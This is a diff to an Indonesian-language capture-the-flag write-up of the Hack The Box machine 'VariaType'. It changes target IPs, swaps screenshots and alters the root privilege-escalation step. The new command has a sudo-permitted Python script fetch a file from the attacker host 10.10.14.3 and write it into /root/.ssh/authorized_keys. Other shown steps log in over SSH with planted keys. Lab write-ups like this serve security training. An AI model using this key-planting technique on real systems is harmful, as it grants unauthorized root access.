@@ -91,7 +91,7 @@ Adanya redirect ke domain virtual host mengisyaratkan bahwa nama domain tersebut
 Karena layanan web melakukan redirect ke domain kustom, entri baru harus ditambahkan ke file resolusi host lokal agar permintaan bisa diarahkan dengan tepat:
 
 ```bash
-echo "10.129.11.170 variatype.htb" | sudo tee -a /etc/hosts
+echo "10.129.42.177 variatype.htb" | sudo tee -a /etc/hosts
 ```
 
 ![Penambahan entri host untuk variatype.htb](gambar/05-hosts-config.png)
@@ -337,7 +337,7 @@ Dengan payload sudah berada di lokasi yang tepat, tinggal menunggu scheduled job
 Setelah menunggu beberapa saat agar payload diproses, koneksi SSH dicoba menggunakan private key yang telah dibuat sebelumnya:
 
 ```bash
-ssh -i steve_key steve@10.129.11.170
+ssh -i steve_key steve@10.129.42.177
 ```
 
 ![SSH berhasil masuk sebagai user steve](gambar/21-ssh-user-access.png)
@@ -347,6 +347,8 @@ Koneksi berhasil terhubung tanpa meminta password — mengonfirmasi bahwa public
 ```bash
 cat ~/user.txt
 ```
+
+![SSH berhasil masuk sebagai user steve](gambar/user-txt.png)
 
 Akses penuh sebagai user `steve` telah terbukti. Kini saatnya beralih ke tahap eskalasi privileges untuk meraih kontrol penuh atas sistem.
 
@@ -377,7 +379,7 @@ Aturan `sudo` ini sangat menarik karena skrip menerima argumen tambahan (ditanda
 Setelah mengidentifikasi skrip yang bisa dieksploitasi, sebuah SSH key pair baru disiapkan khusus untuk akses root:
 
 ```bash
-ssh-keygen -t ed25519 -f root_key -N ""
+ssh-keygen -t ed25519 -f root_key -N "" -C "root_variatype"
 ```
 
 ![Pembuatan SSH key pair untuk akses root](gambar/23-root-keygen.png)
@@ -390,22 +392,8 @@ Dua file dihasilkan: `root_key` sebagai private key dan `root_key.pub` sebagai p
 
 Agar skrip Python yang berjalan sebagai root bisa mengambil public key dari mesin penyerang, sebuah HTTP server disiapkan untuk melayani file tersebut:
 
-```python
-# server.py
-from http.server import HTTPServer, BaseHTTPRequestHandler
-
-class Handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        with open("root_key.pub", "rb") as f:
-            self.wfile.write(f.read())
-
-HTTPServer(("0.0.0.0", 9090), Handler).serve_forever()
-```
-
 ```bash
-python3 server.py
+python3 handler_root.py
 ```
 
 ![HTTP server berjalan untuk melayani root_key.pub](gambar/24-key-hosting.png)
@@ -419,9 +407,7 @@ Server ini dikonfigurasi untuk mengembalikan konten `root_key.pub` setiap kali a
 Dengan semua persiapan selesai, eksploitasi final dijalankan. Skrip Python yang bisa dieksekusi sebagai root dimanfaatkan untuk mengambil public key dari mesin penyerang dan menulisnya langsung ke `/root/.ssh/authorized_keys`:
 
 ```bash
-sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
-  "http://10.10.14.X:9090/root_key.pub" \
-  --output /root/.ssh/authorized_keys
+sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.3:9090/%2Froot%2F.ssh%2Fauthorized_keys
 ```
 
 ![Eksploitasi sudo berhasil menulis root public key ke authorized_keys](gambar/25-privesc-exploit.png)
@@ -429,18 +415,18 @@ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
 Output mengonfirmasi bahwa file berhasil diunduh dan dipasang di `/root/.ssh/authorized_keys`. Koneksi SSH sebagai root pun langsung dicoba:
 
 ```bash
-ssh -i root_key root@10.129.11.170
+ssh -i root_key root@10.129.42.177
 ```
 
 ![SSH sebagai root berhasil — sistem berhasil dikuasai sepenuhnya](gambar/26-root-access.png)
 
-Shell root terbuka. Perintah `whoami` mengembalikan `root`, dan root flag berhasil diambil:
+Shell root terbuka. flag root berhasil diambil:
 
 ```bash
 cat /root/root.txt
 ```
 
-**Mesin VariaType berhasil dikuasai sepenuhnya.**
+![ROOT_FLAG](gambar/root-txt.png)
 
 ---
 
